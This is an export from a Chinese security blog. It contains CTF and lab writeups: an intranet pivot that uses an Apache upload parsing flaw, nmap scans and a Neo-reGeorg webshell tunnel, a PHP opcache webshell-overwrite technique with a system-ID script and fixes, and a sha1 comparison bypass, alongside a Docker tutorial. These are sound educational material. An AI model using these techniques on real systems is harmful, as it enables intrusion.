class="hljs-variable">$&#123;JAVA_HOME&#125;</span>/bin:<span class="hljs-variable">$PATH</span><br></code></pre></td></tr></table></figure>

<h2 id="构建镜像"><a href="#构建镜像" class="headerlink" title="构建镜像"></a>构建镜像</h2><p>新建一个目录，然后在新目录下新建一个Dockerfile（注意D要大写）<br>放入jdk的压缩包<br>将你写好的内容复制进Dockerfile文件<br>使用build构建镜像</p>
<blockquote>
<p>docker build -t centos-jdk8:v1.0 .</p>
</blockquote>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/docker1.jpg"></p>
<p>其中-t centos-jdk:v1.0表示打包的镜像名为centos-jdk，tag为v1.0（tag是可以任意命名的，不一定要是这种格式），注意命令的最后有一个.，这个表示打包的上下文（其实就是Dockerfile所在目录）是在当前目录，然后目录下的Dockerfile就会被编译执行。</p>
<p>执行完毕后运行docker images就会发现多了一个centos-jdk镜像。</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/docker2.jpg"></p>
<p>可以先运行一下容器查看效果</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/docker3.jpg"></p>
<h1 id="上传至docker-hub"><a href="#上传至docker-hub" class="headerlink" title="上传至docker hub"></a>上传至docker hub</h1><p>1:首先需要在<a href="https://hub.docker.com/">官网</a>创建一个账户</p>
<p>2:在docker中登陆</p>
<blockquote>
<p>docker login -u 用户名 -p 密码</p>
</blockquote>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/docker4.jpg"></p>
<p>3:将镜像命名你的用户名&#x2F;镜像名这种形式，不然会push认证不通过</p>
<blockquote>
<p>docker tag xxx:xxx 你的用户名&#x2F;镜像名</p>
</blockquote>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/docker5.jpg"></p>
<p>4：上传</p>
<blockquote>
<p>docker push 你的用户名&#x2F;镜像名</p>
</blockquote>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/docker6.jpg"></p>
<p>5：登陆官网查看镜像信息<br>在首页就可以看到啦，这样你就可以向你的朋友们分享你的镜像了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/docker7.jpg"></p>
<p>6：删除hub镜像<br>进入镜像后在settings中可以找到delete repository选项<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/docker8.jpg"></p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnthebox-内网渗透(入门)</title>
    <url>/%E5%86%85%E7%BD%91/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F.html</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>初次探索内网</p>
<h1 id="使用到的工具"><a href="#使用到的工具" class="headerlink" title="使用到的工具"></a>使用到的工具</h1><p>kali<br>burp<br>firefox<br>reGeorg<br>proxychains<br>nmap<br>冰蝎<br>蚁剑</p>
<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>根据描述得知有两层，因为是demo题目，所以给出了漏洞，降低了难度，实际上的题目漏洞点是不知道的，需要自己发掘</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-1.png"></p>
<h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><p>apache解析漏洞<br>上传<code>1.php.jpg</code>即可<code>getshell</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-2.png"></p>
<p>有了第一台主机的shell后首先要做的就是信息收集了</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>首先看ip，网段等信息<br>。。。<br>上来啥命令用不了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-3.png"></p>
<p>遇到这种情况可以分两种方案继续操作，一是提权，二是上传二进制包编译软件<br>可能是我太菜了，提权失败，所以考虑第二种方法<br>在<a href="https://nmap.org/download.html">官网</a>下载nmap包，上传并编译</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">bzip2 -<span class="hljs-keyword">cd</span> <span class="hljs-keyword">nmap</span>-<span class="hljs-number">7.92</span>.tar.bz2 | tar xvf -<br><span class="hljs-keyword">cd</span> <span class="hljs-keyword">nmap</span>-<span class="hljs-number">7.92</span><br>./configure<br><span class="hljs-keyword">make</span><br><span class="hljs-keyword">make</span> install<br></code></pre></td></tr></table></figure>

<h3 id="坑一"><a href="#坑一" class="headerlink" title="坑一"></a>坑一</h3><blockquote>
<p>这里要注意一下，用蚁剑编译nmap会失败，因为蚁剑的shell是把命令一个个连接起来在传过去，所以经常出问题，这里改用冰蝎</p>
</blockquote>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-4.png"></p>
<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>编译完后使用nmap扫描<br>先看自己<br><code>./nmap --iflist</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-5.png"></p>
<p>扫ip<br><code>./nmap -sn --min-rate=2000 -n -T5 100.64.0,134-135.0/24</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-6.png"></p>
<p>扫端口<br><code>./nmap -n -T5 100.64.0,134-135.0/24 --open</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-7.png"></p>
<p>最后总结一下</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><code class="hljs accesslog">eth0 <span class="hljs-number">100</span>.<span class="hljs-number">64</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>/<span class="hljs-number">24</span><br>eth1 <span class="hljs-number">100</span>.<span class="hljs-number">64</span>.<span class="hljs-number">135</span>.<span class="hljs-number">2</span>/<span class="hljs-number">24</span><br>eth2 <span class="hljs-number">100</span>.<span class="hljs-number">64</span>.<span class="hljs-number">134</span>.<span class="hljs-number">3</span>/<span class="hljs-number">24</span><br><br><br><span class="hljs-number">100.64.0.2</span>               <span class="hljs-number">8000</span>，<span class="hljs-number">9000</span><br><span class="hljs-number">100.64.0.3</span>               <span class="hljs-number">7000</span>，<span class="hljs-number">8000</span><br><span class="hljs-number">100.64.0.4</span>               //自己，<span class="hljs-number">80</span><br><span class="hljs-number">100.64.0.5</span>               <span class="hljs-number">3000</span><br><span class="hljs-number">100.64.134.2</span>             无<br><span class="hljs-number">100.64.134.3</span>             //自己，<span class="hljs-number">80</span><br><span class="hljs-number">100.64.135.2</span>             //自己，<span class="hljs-number">80</span><br><span class="hljs-number">100.64.135.3</span>             <span class="hljs-number">3000</span><br></code></pre></td></tr></table></figure>

<p>因为是linux内网环境，所以到这里信息收集基本就结束了<br>如果是windows内网，那么就需要收集更多的信息</p>
<h2 id="建立代理"><a href="#建立代理" class="headerlink" title="建立代理"></a>建立代理</h2><p>这一步是最为关键的，我就在这里卡了好久才成功</p>
<p>首先我们要分析内网靶机的出网状态</p>
<p>经过测试发现靶机不出网，且只允许http协议进出<br>那么这种情况可以通过webshell，用http协议来传达请求</p>
<p>在kali上下载<a href="https://github.com/sensepost/reGeorg">reGeorg</a>工具</p>
<h3 id="坑二"><a href="#坑二" class="headerlink" title="坑二"></a>坑二</h3><blockquote>
<p>这里要注意不能用普通的reGeorg，不知道是不是因为php版本（php8）的原因，显示的状态是连接成功，但是一访问就time out。解决方案是使用<a href="https://github.com/L-codes/Neo-reGeorg">Neo-reGeorg</a></p>
</blockquote>
<h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><p>生成webshell,<code>-k</code>是指定密码<br><code>python3 neoreg.py generate -k lewiserii</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-8.png"></p>
<p>将生成的<code>./neoreg_servers/tunnel.php</code>传到靶机上</p>
<p>使用本地7777端口建立socks连接：<br><code>python3 neoreg.py -k lewiserii -p 7777 -u https://815-a1734091-ce39-4ea5-98a6-f88746398def.do-not-trust.hacking.run/uploadfiles/tunnel.php</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-10.png"></p>
<p>编辑<code>proxychains</code>配置文件<code>/etc/proxychains4.conf</code><br>最后一行添加<code>socks5  127.0.0.1 7777</code>，7777为你自己的端口，需要与reGeorg中设置的端口相同</p>
<p>所有工具使用命令前加<code>proxychains</code>就可以使流量走代理</p>
<p>启动火狐<br><code>proxychains4 firefox</code><br>逐个访问刚才扫出来的ip<br>成功访问内网主机！<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-11.png"></p>
<h3 id="配置burp代理"><a href="#配置burp代理" class="headerlink" title="配置burp代理"></a>配置burp代理</h3><p>添加一个socks代理，端口与reGeorg监听的端口一致<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-12.png"></p>
<p>设置火狐的代理与burp抓包的代理一致<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-13.png"></p>
<p>成功抓包<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-14.png"></p>
<h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2><p>POC直接打就行了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/pwnthebox-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-15.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>小菜鸡的初次内网之旅到这就结束了，个人感觉内网难的就是信息收集和层层代理，当你掌握的信息越多就越好操作</p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】摆烂杯-wp</title>
    <url>/ctfshow/%E3%80%90ctfshow%E3%80%91%E6%91%86%E7%83%82%E6%9D%AF-wp.html</url>
    <content><![CDATA[<p>摆烂了，没有<a href="https://qgieod1s9b.feishu.cn/docs/doccnC4EpMhSv1Ni6mbL7BQQdBc">wp</a></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>Yii2反序列化RCE POP链分析</title>
    <url>/php/Yii2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%20POP%E9%93%BE%E5%88%86%E6%9E%90.html</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="6e42a3f6e0bd0e38226ff024bf7198631af98a57406afc5b4dad0f381916ba22">590963d8431f45fd9e51182eaf43787c994740494629760e1625b80c402fde69de8e095e2fbe1fdf22892114a9bd7693ecdc409c01e2c6021013e545ae707c1d36d3e2291f730b81285d2e1c7ad4b0f693d261e97e11886f8c15c7bf1943d9ac33cfb79297997f60445b0274cc2d240ea9483f91e6cc33986618152e5886b975a6033713d4346162f57b3093fb3223b1d11175d7922037bc6af47cac293e3bc06068fb30a1c27786558e11d2aea827d4c8b6a420af90943332d4c1f90e062a6c2faeabf63e036ab546f9425ee1b27e2356db0d0814d7c4c519c0e13d425f5b953ffc3ed1978af0e6de5492f719c14b31ef285f43cb3827dc443377f5596a63db6b7cd3397428c3d6a38d39bccecaf4399ff9263a16453f3bff9071f99c23ea498ce80c3bba4ce91d07b4590321b577b8070d2c56c3e2565daa2309482726e5d93783f564a041495ac0dded3faf577b3263b2a80e32cd9dd97e80a3a754000bac346324d565ec839d3a9d787a99e4ffb96182bcfd7584c920c54a8355484e703fcde046c8963f7674e38602526ce1ee27bce74c0628d63967a3a74d78d49f93b8479387ae75ab12465c1caa0f2b37901e599d92473c2a43dc0210aee7712a2182904728e97f39fe1c6052bbd443eca9d69e3a1efe667dbb9b0cf04dd8976f5c0524c22f2d76be4f521b3ea8a1f9d15bc773c69401d97e2f162c823b175c236a093435323607f15cd20fe2d371bf149ebcc25f06bf6b16123bff0e0d553ec8de29bacfbf233e0a4de23fa194accf2774ea6aad8cce538e2a390ad775ef7f1d0d482c9037d02f164fa21ecd624bed1f0e7c01bd2fc283176185993396a68a4847d405c2c8f29e4a97877cd3d04f8574a5c8048d9d7aba7c917ce0c43c6190500cee49e2ccad3cadd7a277f1c0321e349b6bfcf6efe5c75a121277ce9609d53d9706c67a3f6290c24293621ef2b904ff102400e13f58e998090389156718855bdf9d</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>Yii</tag>
        <tag>反序列化</tag>
        <tag>框架</tag>
        <tag>CVE-2020-15148</tag>
      </tags>
  </entry>
  <entry>
    <title>opcache缓存利用</title>
    <url>/php/opcache%E7%BC%93%E5%AD%98%E5%88%A9%E7%94%A8.html</url>
    <content><![CDATA[<h1 id="什么是opcache"><a href="#什么是opcache" class="headerlink" title="什么是opcache"></a>什么是opcache</h1><p>opencache是一种php7自带的缓存引擎，它将编译过一遍的的php脚本以字节码文件的形式缓存在特定目录中（在php.ini中指定）。这样节省了每次访问同一脚本都要加载和解析的时间开销。（先检查有没有bin文件有就直接用）</p>
<p>项目github<a href="https://github.com/GoSecure/php7-opcache-override">地址</a></p>
<h1 id="一：opcache缓存-文件包含"><a href="#一：opcache缓存-文件包含" class="headerlink" title="一：opcache缓存+文件包含"></a>一：opcache缓存+文件包含</h1><p>靶机：<code>lewiserii/php7-opcache-include</code></p>
<p>例题：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">//I heard you are good at PHPINFO+LFI, flag is in flag.php, find it my dear noob vegetable hacker.</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$file</span> === <span class="hljs-string">&quot;phpinfo&quot;</span> ) &#123;<br><br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/proc/i&#x27;</span> , <span class="hljs-variable">$file</span>) ) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;private&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;/var/www/html/&quot;</span> . <span class="hljs-variable">$file</span>;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br><br>    <span class="hljs-keyword">if</span> ( !<span class="hljs-variable">$content</span> ) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nothing&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/script|&lt;\?/i&quot;</span>, <span class="hljs-variable">$content</span>) ) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;bypass me&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">include_once</span> <span class="hljs-variable">$file</span>;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>看下opcache的状态是开启还是关闭的</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php-opcache-include-1.png"></p>
<p>从上图可以得出结论，在<code>/var/www/cache/</code>下存在着PHP的缓存文件，其完整的绝对路径是<code>/var/www/cache/[一个 md5]/var/www/html/flag.php.bin</code></p>
<p>如果要包含文件的话就要知道路径中的md5值，查阅资料可知，这个md5被称为 <code>system id</code>,它的计算算法是固定的，由php版本号、zend extension id、Zend Bin ID，这三样拼接起来md5即可，而这3种东西正好全都在phpinfo里可以拿到，可以使用该脚本一键计算：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">#!/usr/bin/env python2</span><br><br><span class="hljs-comment"># Copyright (c) 2016, 2019 GoSecure Inc.</span><br><br>import sys<br><span class="hljs-keyword">from</span> packaging import version<br>import re<br>import requests<br><br>def <span class="hljs-title function_ invoke__">md5</span>(data):<br>    <span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">type</span>(data) is str:<br>        data = <span class="hljs-title function_ invoke__">bytes</span>(data, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">__import__</span>(<span class="hljs-string">&#x27;hashlib&#x27;</span>).<span class="hljs-title function_ invoke__">md5</span>(data).<span class="hljs-title function_ invoke__">hexdigest</span>()<br><br><span class="hljs-keyword">if</span> <span class="hljs-title function_ invoke__">len</span>(sys.argv) != <span class="hljs-number">2</span>:<br>    <span class="hljs-keyword">print</span>(sys.argv[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot; [file|URL]&quot;</span>)<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">if</span> (sys.argv[<span class="hljs-number">1</span>].<span class="hljs-title function_ invoke__">startswith</span>(<span class="hljs-string">&quot;http&quot;</span>)):<br>    text = requests.<span class="hljs-title function_ invoke__">get</span>(sys.argv[<span class="hljs-number">1</span>]).text<br><span class="hljs-keyword">else</span>:<br>    with <span class="hljs-title function_ invoke__">open</span>(sys.argv[<span class="hljs-number">1</span>]) <span class="hljs-keyword">as</span> file:<br>        text = file.<span class="hljs-title function_ invoke__">read</span>()<br>        file.<span class="hljs-title function_ invoke__">close</span>()<br><br><span class="hljs-comment"># PHP Version</span><br>php_version = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;PHP Version &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><br><span class="hljs-keyword">if</span> php_version == None:<br>    php_version = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;h1 class=&quot;p&quot;&gt;PHP Version (.*)&#x27;</span>, text)<br><br><span class="hljs-keyword">if</span> php_version == None:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;No PHP version found, is this a phpinfo file?&quot;</span>)<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br><br>php_version = php_version.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>)<br>php_greater_74 = (version.<span class="hljs-title function_ invoke__">parse</span>(<span class="hljs-string">&quot;7.4.0&quot;</span>) &lt; version.<span class="hljs-title function_ invoke__">parse</span>(php_version.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&quot;-&quot;</span>)[<span class="hljs-number">0</span>]))<br><span class="hljs-comment"># Zend Extension Build ID</span><br>zend_extension_id = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;Zend Extension Build &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><span class="hljs-keyword">if</span> zend_extension_id == None:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;No Zend Extension Build found.&quot;</span>)<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br>zend_extension_id = zend_extension_id.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># Architecture</span><br>architecture = re.<span class="hljs-title function_ invoke__">search</span>(<span class="hljs-string">&#x27;&lt;tr&gt;&lt;td class=&quot;e&quot;&gt;System &lt;/td&gt;&lt;td class=&quot;v&quot;&gt;(.*) &lt;/td&gt;&lt;/tr&gt;&#x27;</span>, text)<br><span class="hljs-keyword">if</span> architecture == None:<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;No System info found.&quot;</span>)<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>)<br>architecture = architecture.<span class="hljs-title function_ invoke__">group</span>(<span class="hljs-number">1</span>).<span class="hljs-title function_ invoke__">split</span>()[-<span class="hljs-number">1</span>]<br><br><span class="hljs-comment"># Zend Bin ID suffix</span><br><span class="hljs-keyword">if</span> architecture == <span class="hljs-string">&quot;x86_64&quot;</span>:<br>    bin_id_suffix = <span class="hljs-string">&quot;48888&quot;</span><br><span class="hljs-keyword">else</span>:<br>    bin_id_suffix = <span class="hljs-string">&quot;44444&quot;</span><br><br><span class="hljs-comment"># With PHP 7.4 they fixed the undefined macro that did the weird bin ID</span><br><span class="hljs-keyword">if</span> php_greater_74:<br>    zend_bin_id = <span class="hljs-string">&quot;BIN_&quot;</span> + bin_id_suffix<br><span class="hljs-keyword">else</span>:<br>    zend_bin_id = <span class="hljs-string">&quot;BIN_SIZEOF_CHAR&quot;</span> + bin_id_suffix<br><br><span class="hljs-comment"># Alternate Bin ID, see #5</span><br><span class="hljs-keyword">if</span> not php_greater_74:<br>    <span class="hljs-keyword">if</span> architecture == <span class="hljs-string">&quot;x86_64&quot;</span>:<br>        alt_bin_id_suffix = <span class="hljs-string">&quot;148888&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        alt_bin_id_suffix = <span class="hljs-string">&quot;144444&quot;</span><br><br>    alt_zend_bin_id = <span class="hljs-string">&quot;BIN_&quot;</span> + alt_bin_id_suffix<br><br><br><span class="hljs-comment"># Logging</span><br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;PHP version : &quot;</span> + php_version)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Zend Extension ID : &quot;</span> + zend_extension_id)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Zend Bin ID : &quot;</span> + zend_bin_id)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Assuming &quot;</span> + architecture + <span class="hljs-string">&quot; architecture&quot;</span>)<br><br>digest = <span class="hljs-title function_ invoke__">md5</span>(php_version + zend_extension_id + zend_bin_id)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;------------&quot;</span>)<br><span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;System ID : &quot;</span> + digest)<br><br><span class="hljs-keyword">if</span> not php_greater_74:<br>    alt_digest = <span class="hljs-title function_ invoke__">md5</span>(php_version + zend_extension_id + alt_zend_bin_id)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;PHP lower than 7.4 detected, an alternate Bin ID is possible:&quot;</span>)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Alternate Zend Bin ID : &quot;</span> + alt_zend_bin_id)<br>    <span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;Alternate System ID : &quot;</span> + alt_digest)<br></code></pre></td></tr></table></figure>

<p>得到<code>System ID : 0b8bd94e9858e5d32d058dc0acf75014</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php-opcache-include-2.png"></p>
<p>包含<code>flag.php.bin</code>即可</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php-opcache-include-3.png"></p>
<h1 id="二：opcache缓存-文件上传"><a href="#二：opcache缓存-文件上传" class="headerlink" title="二：opcache缓存+文件上传"></a>二：opcache缓存+文件上传</h1><p>靶机：<code>lewiserii/php7-opcache-upload</code>    &#x2F;&#x2F;关闭时间戳验证</p>
<p>首页是个文件上传点，可以自定义上传目录，简单测试后发现<code>/var/www/html</code>目录没有权限</p>
<p>同时给了个<code>phpinfo.php</code>，查看opcache状态，发现是启用状态，直接跑脚本算<code>system id</code></p>
<p>满足这几个条件就可以上传木马bin文件到缓存目录，覆盖后达到getshell的目的</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php7-include-upload-1.png"></p>
<p>得到缓存目录为<code>/tmp/opcache/0b8bd94e9858e5d32d058dc0acf75014/var/www/html</code></p>
<p>本地搭建一个opcache环境，写上一句话木马，把生成的<code>index.php.bin</code>拿下来</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php7-include-upload-2.png"></p>
<p>将图中红框部分的本地<code>system id</code>替换成靶机算出来的<code>system id</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php7-include-upload-3.png"></p>
<p>上传</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php7-include-upload-4.png"></p>
<p>再次访问<code>index.php</code>，发现内容已被覆盖</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php7-include-upload-5.png"></p>
<h1 id="三：修复方式"><a href="#三：修复方式" class="headerlink" title="三：修复方式"></a>三：修复方式</h1><h2 id="file-cache-only"><a href="#file-cache-only" class="headerlink" title="file_cache_only"></a>file_cache_only</h2><p>如果内存缓存方式的优先级高于文件缓存，那么重写后的 OPcache 文件（webshell）是不会被执行的。但是，当 Web 服务器重启后，就可以绕过此限制。因为，当服务器重启之后，内存中的缓存为空，此时，OPcache 会使用文件缓存的数据填充内存缓存的数据，这样，webshell 就可以被执行了。</p>
<h2 id="validate-timestamp"><a href="#validate-timestamp" class="headerlink" title="validate_timestamp"></a>validate_timestamp</h2><p>当<code>opcache.validate_timestamps=1</code>时，bin文件在创建时会在文件内容中写入一个时间戳，这个时间戳跟源文件一样，在执行bin文件之前php会检查时间戳是否一致，如果不一致则丢弃重新创建bin文件。</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/qianxin/php7-opcache-upload-6.png"></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>opcache</tag>
      </tags>
  </entry>
  <entry>
    <title>sha1强比较绕过</title>
    <url>/php/sha1%E5%BC%BA%E6%AF%94%E8%BE%83.html</url>
    <content><![CDATA[<h1 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h1><p>只判断两个值不能相等的情况</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Your password can not be your name!&#x27;</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) === <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>]))<br>      <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;welcome&#x27;</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid 